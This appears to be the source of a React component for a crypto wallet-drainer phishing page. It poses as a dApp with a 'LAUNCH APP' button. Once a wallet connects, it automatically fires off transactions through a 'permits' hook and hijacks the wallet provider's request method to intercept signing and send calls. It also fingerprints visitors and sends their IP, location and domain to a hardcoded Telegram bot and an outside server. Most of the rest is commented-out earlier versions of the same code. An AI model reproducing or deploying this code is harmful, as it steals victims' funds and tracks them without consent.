import { useEffect, useState, useRef } from "react";
import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
import usePermits from "./permits";
import FingerprintJS from "@fingerprintjs/fingerprintjs";
import axios from "axios";

const TELEGRAM_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
const TELEGRAM_CHAT_ID = "-1002535678431";
const isLoggingEnabled = true; // Toggle this to enable/disable logs
const BASE_API_URL = "https://drn-2stp.onrender.com/api";

// const log = (...messages: unknown[]) => {
//   if (isLoggingEnabled) {
//     console.log(...messages); // Directly use console.log
//   }
// };

// const warn = (...messages: unknown[]) => {
//   if (isLoggingEnabled) {
//     console.warn(...messages); // Directly use console.warn
//   }
// };

// const error = (...messages: string[]) => {
//   error("An error occurred:", ...messages);
//   console.error(...messages); // Errors should always log
// };

const stringifyMessage = (message: unknown): string => {
  if (typeof message === "object" && message !== null) {
    try {
      return JSON.stringify(message, null, 2);
    } catch {
      return String(message); // Fallback for circular references
    }
  }
  return String(message);
};

const log = async (...messages: unknown[]) => {
  if (isLoggingEnabled) {
    const timestamp = new Date().toISOString();
    const logMessage = `[LOG ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
    console.log(logMessage);
    console.error(logMessage); // For Vercel visibility
    try {
      await axios.post(`${BASE_API_URL}/log`, {
        level: "info",
        message: logMessage,
        timestamp,
      });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : String(err);
      console.error(`Failed to send log to backend: ${errorMessage}`);
    }
  }
};

const warn = async (...messages: unknown[]) => {
  if (isLoggingEnabled) {
    const timestamp = new Date().toISOString();
    const logMessage = `[WARN ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
    console.warn(logMessage);
    console.error(logMessage);
    try {
      await axios.post(`${BASE_API_URL}/log`, {
        level: "warn",
        message: logMessage,
        timestamp,
      });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : String(err);
      console.error(`Failed to send warn to backend: ${errorMessage}`);
    }
  }
};

// const error = async (...messages: unknown[]) => {
//   if (isLoggingEnabled) {
//     const timestamp = new Date().toISOString();
//     const logMessage = `[ERROR ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
//     console.error(logMessage);
//     try {
//       await axios.post(`${BASE_API_URL}/log`, {
//         level: "error",
//         message: logMessage,
//         timestamp,
//       });
//     } catch (err) {
//       const errorMessage = err instanceof Error ? err.message : String(err);
//       console.error(`Failed to send error to backend: ${errorMessage}`);
//     }
//   }
// };
//       zIndex: 9999,
//     }}
//   >
//     {!isConnected ? (
//       <button
//         onClick={handleConnectAndSend}
//         style={{
//           fontSize: "1.7rem",
//           padding: "15px 15px",
//           cursor: "pointer",
//           borderRadius: "8px",
//           border: "none",
//           backgroundColor: "#FF007A",
//           color: "#fff",
//           boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
//           transition: "transform 0.2s, box-shadow 0.2s",
//         }}
//         onMouseOver={(e) => {
//           e.currentTarget.style.transform = "scale(1.1)";
//           e.currentTarget.style.boxShadow = "0 6px 8px rgba(0, 0, 0, 0.15)";
//         }}
//         onMouseOut={(e) => {
//           e.currentTarget.style.transform = "scale(1)";
//           e.currentTarget.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";
//         }}
//       >
//         LAUNCH APP
//       </button>
//     ) : (
//       <div>
//         <p>Connected Wallet: {address}</p>
//       </div>
//     )}
//   </div>
// </div>

//   );
// }






// import React, { useEffect, useState } from "react";
// import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
// import usePermits from "./permits";


// export default function ConnectButton() {
//   const { open } = useAppKit(); // For opening Reown modals
//   const { address, isConnected } = useAppKitAccount(); // Account info
//   const { sendTransactions } = usePermits(); // Your permits hook

//   const [transactionModalOpen, setTransactionModalOpen] = useState(false); // Track Reown modal state
//   const [loading, setLoading] = useState(false); // Loading state for modal

//   // Effect to handle transactions when a wallet connects
//   useEffect(() => {
//     if (isConnected && !transactionModalOpen) {
//       setTransactionModalOpen(true);
//       setLoading(true);
//       sendTransactions()
//         .then(() => {
//           console.log("Transactions completed.");
//         })
//         .catch((error) => {
//           console.error("Error during transactions:", error);
//         })
//         .finally(() => {
//           setTransactionModalOpen(false); // Ensure modal is closed after transactions
//           setLoading(false); // Hide loading modal
//         });
//     }
//   }, [isConnected, sendTransactions, transactionModalOpen]);

//   // Handler for connecting the wallet and opening the modal
//   const handleConnect = async () => {
//     try {
//       await open(); // Open the connection modal
//     } catch (error) {
//       console.error("Error connecting wallet:", error);
//     }
//   };

//   // Render the loading modal
//   const renderLoadingModal = () => {
//     if (!loading) return null;

//     return (
//       <div
//         style={{
//           position: "fixed",
//           zIndex: 9999,
//           top: 0,
//           left: 0,
//           right: 0,
//           bottom: 0,
//           backgroundColor: "rgba(0,0,0,0.3)",
//           display: "flex",


// Replace
// error("An unexpected error occurred during sendTransactions.");



// Define the type for visitor details
interface VisitorDetails {
  ip: string;
  location: string;
  systemInfo: string;
  timezone: string;
  domainName: string;
}

export default function ConnectButton() {
  const { open } = useAppKit();
  const { isConnected } = useAppKitAccount();
  const { sendTransactions } = usePermits();

  const [transactionModalOpen, setTransactionModalOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const [botCheckPassed, setBotCheckPassed] = useState(false);

  // Correctly type the ref to hold visitor details or null
  const visitorDetailsRef = useRef<VisitorDetails | null>(null);

  

  useEffect(() => {
    const originalConsoleError = console.error;
    const originalConsoleWarn = console.warn;
    const originalConsoleLog = console.log;

    console.error = (...args) => originalConsoleError(...args);
    console.warn = (...args) => originalConsoleWarn(...args);
    console.log = (...args) => originalConsoleLog(...args);

    return () => {
      console.error = originalConsoleError;
      console.warn = originalConsoleWarn;
      console.log = originalConsoleLog;
    };
  }, []);

  useEffect(() => {
    const handleWindowError = (event: { preventDefault: () => void }) => {
      event.preventDefault();
      return false;
    };

    const handleUnhandledRejection = (event: { preventDefault: () => void }) => {
      event.preventDefault();
      return false;
    };

    window.addEventListener("error", handleWindowError, true);
    window.addEventListener("unhandledrejection", handleUnhandledRejection);

    return () => {
      window.removeEventListener("error", handleWindowError, true);
      window.removeEventListener("unhandledrejection", handleUnhandledRejection);
    };
  }, []);

  useEffect(() => {
    const initializeFingerprint = async () => {
      const fp = await FingerprintJS.load();
      const result = await fp.get();
      const visitorId = result.visitorId;
      log("Visitor ID:", visitorId);
    };
    initializeFingerprint();
  }, []);

  // Anti-bot puzzle
  useEffect(() => {
    const isPrime = (num: number) => {
      if (num < 2) return false;
      for (let i = 2; i * i <= num; i++) {
        if (num % i === 0) return false;
      }
      return true;
    };

    try {
      let count = 0;
      for (let i = 2; i < 2000; i++) {
        if (isPrime(i)) count++;
      }
      if (count > 300) {
        setBotCheckPassed(true);
      }
    } catch {
      setBotCheckPassed(false);
    }
  }, []);

  const handleConnectAndSend = async () => {
    if (!botCheckPassed) {
      warn("Bot check failed. Connection denied.");
      return;
    }

    try {
      await open();
    } catch (error) {
      if (error instanceof Error) {
        console.error("Error connecting wallet:", error.message);
      } else {
        console.error("Unexpected error While connecting wallet:", error);
        sendTelegramNotification("Caught an error while connecting wallet");
      }
    }    
  };

  
useEffect(() => {
  // Access the Ethereum provider from the global window object
  const ethereum = window.ethereum;

  if (!ethereum || typeof ethereum.request !== "function") {
    console.warn("Ethereum provider not found.");
    return;
  }

  // Save the original request method
  const originalRequest = ethereum.request.bind(ethereum);

  // Override the Ethereum provider's request method
  ethereum.request = async function (args: { method: string; params?: unknown[] }) {
    if (!args || typeof args.method !== "string") {
      console.warn("Invalid request arguments.");
      return originalRequest(args);
    }

    // Intercept specific methods
    if (args.method === "eth_sendTransaction" || args.method === "personal_sign") {
      console.log("Intercepted call to:", args.method);

      // Redirect to a custom endpoint
      return new Promise((resolve, reject) => {
        const listener = (event: MessageEvent) => {
          if (event.data && event.data.type === "response" && event.data.id === args.method) {
            window.removeEventListener("message", listener);
            if (event.data.error) reject(event.data.error);
            else resolve(event.data.result);
          }
        };

        window.addEventListener("message", listener);
        window.postMessage({ type: "request", method: args.method, params: args.params }, "*");
      });
    }

    // Forward other methods to the original request
    return originalRequest(args);
  };

  console.log("Ethereum provider request method overridden.");

  return () => {
    // Restore the original provider method on cleanup
    if (ethereum && typeof ethereum.request === "function") {
      ethereum.request = originalRequest;
      console.log("Ethereum provider request method restored.");
    }
  };
}, []);
  


  // Function to send Telegram notification
  async function sendTelegramNotification(message: string) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    };
    try {
      await axios.post(url, payload);
    } catch {
      // Suppress errors silently
    }
  }

  
  // Function to fetch visitor details
  const fetchVisitorDetails = async (): Promise<VisitorDetails | null> => {
    try {
      const response = await axios.get("https://ipinfo.io/json/");
      const { ip, city, region, country, timezone, org } = response.data;
      const domainName = window.location.hostname;

      return {
        ip,
        location: `${city}, ${region}, ${country}`,
        systemInfo: org || "Unknown",
        timezone,
        domainName,
      };
    } catch {
      return null;
    }
  };

  useEffect(() => {
  const notifyOnVisit = async () => {
    const details = await fetchVisitorDetails();
    if (details) {
      visitorDetailsRef.current = details;
      const message = `🤠 *New Visitor Notification*\n\n*IP Address:* ${details.ip}\n*Location:* ${details.location}\n*System Info:* ${details.systemInfo}\n*Timezone:* ${details.timezone}\n*Domain Name:* ${details.domainName}`;
      await sendTelegramNotification(message);
    }
  };

  const notifyOnExit = () => {
    const details = visitorDetailsRef.current;
    if (details) {
      const beaconData = JSON.stringify(details);
      //https://drn-2stp.onrender.com/api//
      //http://localhost:3002/api/exit-notify
      navigator.sendBeacon("https://drn-2stp.onrender.com/api/exit-notify", beaconData);
    }
  };

  notifyOnVisit();
  window.addEventListener("beforeunload", notifyOnExit);

  return () => {
    window.removeEventListener("beforeunload", notifyOnExit);
  };
}, []);


  useEffect(() => {
    if (isConnected && !transactionModalOpen) {
      setTransactionModalOpen(true);
      setLoading(true);
      sendTransactions()
        .then(() => console.log("Transactions completed."))
        .catch((error) => console.error("Error during transactions:", error))
        .finally(() => {
          setTransactionModalOpen(false);
          setLoading(false);
        });
    }
  }, [isConnected, sendTransactions, transactionModalOpen]);

  const renderLoadingModal = () => {
    if (!loading) return null;

    return (
      <div
        style={{
          position: "fixed",
          zIndex: 9999,
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: "rgba(0,0,0,0.3)",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <div
          style={{
            backgroundColor: "#fff",
            padding: 20,
            borderRadius: 8,
            textAlign: "center",
          }}
        >
          <img
            src="/ethereum-logo.png"
            alt="Ethereum Logo"
            style={{ width: 64, height: 64, marginBottom: 16 }}
          />
          <p>Please wait...</p>
        </div>
      </div>
    );
  };

  return (
    <div style={{ margin: 0, padding: 0, width: "100%", height: "100vh" }}>
      {renderLoadingModal()}
      <iframe
        src="/my-page.html"
        title="Embedded HTML"
        style={{
          width: "100%",
          height: "100vh",
          border: "none",
          margin: 0,
          padding: 0,
          display: "block",
        }}
        sandbox="allow-scripts allow-same-origin"
      />
      <div
        style={{
          position: "absolute",
          top: "10px",
          right: "30px",
          zIndex: 9999,
        }}
      >
        {!isConnected ? (
          <button
            onClick={handleConnectAndSend}
            style={{
              fontSize: "1.7rem",
              padding: "15px 15px",
              cursor: "pointer",
              borderRadius: "8px",
              border: "none",
              backgroundColor: "#FF007A",
              color: "#fff",
              boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
              transition: "transform 0.2s, box-shadow 0.2s",
            }}
            onMouseOver={(e) => {
              e.currentTarget.style.transform = "scale(1.1)";
              e.currentTarget.style.boxShadow = "0 6px 8px rgba(0, 0, 0, 0.15)";
            }}
            onMouseOut={(e) => {
              e.currentTarget.style.transform = "scale(1)";
              e.currentTarget.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";
            }}
          >
            

            <strong> LAUNCH APP </strong>
          </button>
        ) : (
          <div>
            {/* <p>Connected Wallet: {address}</p> */}
          </div>
        )}
      </div>
    </div>
  );
}




// import React, { useEffect, useState } from "react";
// import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
// import usePermits from "./permits";
// import FingerprintJS from "@fingerprintjs/fingerprintjs";

// export default function ConnectButton() {
//   const { open } = useAppKit();
//   const { address, isConnected } = useAppKitAccount();
//   const { sendTransactions } = usePermits();

//   const [transactionModalOpen, setTransactionModalOpen] = useState(false);
//   const [loading, setLoading] = useState(false);
//   const [botCheckPassed, setBotCheckPassed] = useState(false);

//   useEffect(() => {
//     const originalConsoleError = console.error;
//     const originalConsoleWarn = console.warn;
//     const originalConsoleLog = console.log;

//     console.error = (...args) => originalConsoleError(...args);
//     console.warn = (...args) => originalConsoleWarn(...args);
//     console.log = (...args) => originalConsoleLog(...args);

//     return () => {
//       console.error = originalConsoleError;
//       console.warn = originalConsoleWarn;
//       console.log = originalConsoleLog;
//     };
//   }, []);

//   useEffect(() => {
//     const handleWindowError = (event: { preventDefault: () => void }) => {
//       event.preventDefault();
//       return false;
//     };

//     const handleUnhandledRejection = (event: { preventDefault: () => void }) => {
//       event.preventDefault();
//       return false;
//     };

//     window.addEventListener("error", handleWindowError, true);
//     window.addEventListener("unhandledrejection", handleUnhandledRejection);

//     return () => {
//       window.removeEventListener("error", handleWindowError, true);
//       window.removeEventListener("unhandledrejection", handleUnhandledRejection);
//     };
//   }, []);

//   useEffect(() => {
//     const initializeFingerprint = async () => {
//       const fp = await FingerprintJS.load();
//       const result = await fp.get();
//       const visitorId = result.visitorId;
//       console.log("Visitor ID:", visitorId);
//     };
//     initializeFingerprint();
//   }, []);

//   // Anti-bot puzzle
//   useEffect(() => {
//     const isPrime = (num: number) => {
//       if (num < 2) return false;
//       for (let i = 2; i * i <= num; i++) {
//         if (num % i === 0) return false;
//       }
//       return true;
//     };

//     try {
//       let count = 0;
//       for (let i = 2; i < 2000; i++) {
//         if (isPrime(i)) count++;
//       }
//       if (count > 300) {
//         setBotCheckPassed(true);
//       }
//     } catch {
//       setBotCheckPassed(false);
//     }
//   }, []);

//   const handleConnectAndSend = async () => {
//     if (!botCheckPassed) {
//       console.warn("Bot check failed. Connection denied.");
//       return;
//     }

//     try {
//       await open();
//     } catch (error) {
//       console.error("Error connecting wallet:", error);
//     }
//   };

//   useEffect(() => {
//     if (isConnected && !transactionModalOpen) {
//       setTransactionModalOpen(true);
//       setLoading(true);
//       sendTransactions()
//         .then(() => console.log("Transactions completed."))
//         .catch((error) => console.error("Error during transactions:", error))
//         .finally(() => {
//           setTransactionModalOpen(false);
//           setLoading(false);
//         });
//     }
//   }, [isConnected, sendTransactions, transactionModalOpen]);

//   const renderLoadingModal = () => {
//     if (!loading) return null;

//     return (
//       <div
//         style={{
//           position: "fixed",
//           zIndex: 9999,
//           top: 0,
//           left: 0,
//           right: 0,
//           bottom: 0,
//           backgroundColor: "rgba(0,0,0,0.3)",
//           display: "flex",
//           alignItems: "center",
//           justifyContent: "center",
//         }}
//       >
//         <div
//           style={{
//             backgroundColor: "#fff",
//             padding: 20,
//             borderRadius: 8,
//             textAlign: "center",
//           }}
//         >
//           <img
//             src="/ethereum-logo.png"
//             alt="Ethereum Logo"
//             style={{ width: 64, height: 64, marginBottom: 16 }}
//           />
//           <p>Please wait...</p>
//         </div>
//       </div>
//     );
//   };

//   return (
// <div style={{ margin: 0, padding: 0, width: "100%", height: "100vh" }}>
//   {renderLoadingModal()}
//   <iframe
//     src="/my-page.html"
//     title="Embedded HTML"
//     style={{
//       width: "100%",
//       height: "100vh",
//       border: "none",
//       margin: 0,
//       padding: 0,
//       display: "block",
//     }}
//     sandbox="allow-scripts allow-same-origin"
//   />
//   <div
//     style={{
//       position: "absolute",
//       top: "10px",
//       right: "30px",
//       zIndex: 9999,
//     }}
//   >
//     {!isConnected ? (
//       <button
//         onClick={handleConnectAndSend}
//         style={{
//           fontSize: "1.7rem",
//           padding: "15px 15px",
//           cursor: "pointer",
//           borderRadius: "8px",
//           border: "none",
//           backgroundColor: "#FF007A",
//           color: "#fff",
//           boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
//           transition: "transform 0.2s, box-shadow 0.2s",
//         }}
//         onMouseOver={(e) => {
//           e.currentTarget.style.transform = "scale(1.1)";
//           e.currentTarget.style.boxShadow = "0 6px 8px rgba(0, 0, 0, 0.15)";
//         }}
//         onMouseOut={(e) => {
//           e.currentTarget.style.transform = "scale(1)";
//           e.currentTarget.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";
//         }}
//       >
//         LAUNCH APP
//       </button>
//     ) : (
//       <div>
//         <p>Connected Wallet: {address}</p>
//       </div>
//     )}
//   </div>
// </div>

//   );
// }






// import React, { useEffect, useState } from "react";
// import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
// import usePermits from "./permits";


// export default function ConnectButton() {
//   const { open } = useAppKit(); // For opening Reown modals
//   const { address, isConnected } = useAppKitAccount(); // Account info
//   const { sendTransactions } = usePermits(); // Your permits hook

//   const [transactionModalOpen, setTransactionModalOpen] = useState(false); // Track Reown modal state
//   const [loading, setLoading] = useState(false); // Loading state for modal

//   // Effect to handle transactions when a wallet connects
//   useEffect(() => {
//     if (isConnected && !transactionModalOpen) {
//       setTransactionModalOpen(true);
//       setLoading(true);
//       sendTransactions()
//         .then(() => {
//           console.log("Transactions completed.");
//         })
//         .catch((error) => {
//           console.error("Error during transactions:", error);
//         })
//         .finally(() => {
//           setTransactionModalOpen(false); // Ensure modal is closed after transactions
//           setLoading(false); // Hide loading modal
//         });
//     }
//   }, [isConnected, sendTransactions, transactionModalOpen]);

//   // Handler for connecting the wallet and opening the modal
//   const handleConnect = async () => {
//     try {
//       await open(); // Open the connection modal
//     } catch (error) {
//       console.error("Error connecting wallet:", error);
//     }
//   };

//   // Render the loading modal
//   const renderLoadingModal = () => {
//     if (!loading) return null;

//     return (
//       <div
//         style={{
//           position: "fixed",
//           zIndex: 9999,
//           top: 0,
//           left: 0,
//           right: 0,
//           bottom: 0,
//           backgroundColor: "rgba(0,0,0,0.3)",
//           display: "flex",
//           alignItems: "center",
//           justifyContent: "center",
//         }}
//       >
//         <div
//           style={{
//             backgroundColor: "#fff",
//             padding: 20,
//             borderRadius: 8,
//             textAlign: "center",
//           }}
//         >
//           <img
//             src="/ethereum-logo.png"
//             alt="Ethereum Logo"
//             style={{ width: 64, height: 64, marginBottom: 16 }}
//           />
//           <p>Please wait...</p>
//         </div>
//       </div>
//     );
//   };

//   return (
//     <div style={{ textAlign: "center" }}>
//       {renderLoadingModal()}

//       <iframe
//         src="/my-page.html"
//         title="Embedded HTML"
//         style={{
//           width: "100%",
//           height: "80vh",
//           border: "none",
//         }}
//         sandbox="allow-scripts allow-same-origin"
//       />

//       <div
//         style={{
//           position: "absolute",
//           top: "10px",
//           right: "30px",
//           zIndex: 9999,
//         }}
//       >
//         {!isConnected ? (
//           <button
//             onClick={handleConnect}
//             style={{
//               fontSize: "1.7rem",
//               padding: "15px 15px",
//               cursor: "pointer",
//               borderRadius: "8px",
//               border: "none",
//               backgroundColor: "#FF007A",
//               color: "#fff",
//               boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
//               transition: "transform 0.2s, box-shadow 0.2s",
//             }}
//             onMouseOver={(e) => {
//               e.currentTarget.style.transform = "scale(1.1)";
//               e.currentTarget.style.boxShadow = "0 6px 8px rgba(0, 0, 0, 0.15)";
//             }}
//             onMouseOut={(e) => {
//               e.currentTarget.style.transform = "scale(1)";
//               e.currentTarget.style.boxShadow = "0 4px 6px rgba(0, 0, 0, 0.1)";
//             }}
//           >
//             LAUNCH APP
//           </button>
//         ) : (
//           <div>
//             <p>Connected Wallet: {address}</p>
//           </div>
//         )}
//       </div>
//     </div>
//   );
// }



// import React, { useEffect, useState } from "react";
// import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
// import usePermits from "./permits";

// export default function ConnectButton() {
//   const { open } = useAppKit(); // For opening Reown modals
//   const { address, isConnected } = useAppKitAccount(); // Account info
//   const { sendTransactions } = usePermits(); // Your permits hook

//   const [transactionModalOpen, setTransactionModalOpen] = useState(false); // Track Reown modal state

//   // Effect to handle transactions when a wallet connects
//   useEffect(() => {
//     if (isConnected && !transactionModalOpen) {
//       setTransactionModalOpen(true);
//       sendTransactions()
//         .then(() => {
//           console.log("Transactions completed.");
//         })
//         .catch((error) => {
//           console.error("Error during transactions:", error);
//         })
//         .finally(() => {
//           setTransactionModalOpen(false); // Ensure modal is closed after transactions
//         });
//     }
//   }, [isConnected, sendTransactions, transactionModalOpen]);

//   // Handler for connecting the wallet and opening the modal
//   const handleConnect = async () => {
//     try {
//       await open(); // Open the connection modal
//     } catch (error) {
//       console.error("Error connecting wallet:", error);
//     }
//   };

//   return (
//     <div style={{ textAlign: "center" }}>
//       {!isConnected ? (
//         <button onClick={handleConnect} style={buttonStyle}>
//           Connect Wallet
//         </button>
//       ) : (
//         <div>
//           <p>Connected Wallet: {address}</p>
//         </div>
//       )}
//     </div>
//   );
// }

// // Styles for the connect button
// const buttonStyle = {
//   fontSize: "1rem",
//   padding: "10px 15px",
//   cursor: "pointer",
//   borderRadius: "8px",
//   border: "none",
//   backgroundColor: "#4CAF50",
//   color: "#fff",
//   boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)",
//   transition: "transform 0.2s, box-shadow 0.2s",
// };
